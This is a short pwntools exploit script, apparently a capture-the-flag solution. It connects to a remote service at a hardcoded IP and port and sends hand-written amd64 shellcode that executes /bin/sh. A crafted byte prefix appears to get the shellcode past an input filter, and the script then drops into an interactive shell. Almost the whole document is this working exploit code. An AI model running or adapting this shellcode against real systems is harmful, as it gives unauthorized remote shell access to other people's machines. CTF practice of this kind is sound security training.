from pwn import *
context.log_level='debug'
context.arch='amd64'
#p=process('./shellcode')
#gdb.attach(p,'b *0x4008cb')
p=remote("34.92.37.22",10002)

sh='''
xor rax,rax
mov al,0x3b
xor rsi,rsi
xor rdi,rdi
xor rdx,rdx
mov rdi,0x68732f6e69622f
push rdi
mov rdi,rsp
syscall
'''
sh=asm(sh)
p.sendlineafter(":","\x00gs\njaZ"+sh)
p.interactive()
'''
[_]: pop rdi
[Z]: pop rdx
'''
